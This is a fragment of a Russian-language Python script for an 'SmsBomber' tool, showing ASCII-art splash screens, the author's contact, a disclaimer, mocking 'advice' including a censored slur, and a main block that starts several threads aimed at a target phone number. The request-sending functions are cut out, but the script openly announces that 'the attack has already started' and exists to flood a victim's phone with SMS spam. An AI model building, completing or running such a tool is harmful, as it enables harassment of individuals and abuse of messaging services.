...
anim = [
"""
 Привет.Тебя приветствует SmsBomber v1.0.0
                __
               (_()  ╲
          ╲__/  ||    ╲  ╲__/
          (oo)  /)       (oo)
         ...
         ╲╲__/╲/   _____╲╲__//_____
          |/╲|    |SmsBomber          |
    _____ |||| ___|                |
    _____(_)(_)___|________________|

""",
"""
           __      Если у вас возникли вопросы напиши создателю.
           ||       vk.com/aleksandrkirichek    
      ╲__/ /)     ╲__/ /
      (_o)//      (oo)
      ( ╲╲/_     //~~╲╲
       ╲_╲__)____╲╲__//______
...
""",
"""
                  Пользуйся наздоровеце.
                  Но я не буду нести за
...
""",
"""Лечь на диван, а затем понять...На*** тебе это сдалось.
""",
"""Спустя пару секунд спросить <<Как дела, пид****?>>
""",
"""Оставь всё как есть и идти спатьки.
"""]
y = 0
os.system("clear")
while len(anim) > y:
...
print("\033[32mАтака уже началась. Советую:\033[0m")
print("\033[33m"+sovet[random.randint(0, len(sovet)-1)]+"\033[0m")
print()
print("\033[42m\033[30mЧто бы остановить спам, жмите ctrl+z\033[0m\033[0m")
if __name__ == "__main__":
    x = threading.Thread(target=qw, args=(_phone,))
    y = threading.Thread(target=qww, args=(_phone,))
    a = threading.Thread(target=qwww, args=(_phone,))
    c = threading.Thread(target=qwwww, args=(_phone,))
    b = threading.Thread(target=qwwwww, args=(_phone,))
    x.start()
    y.start()
    c.start()
    b.start()
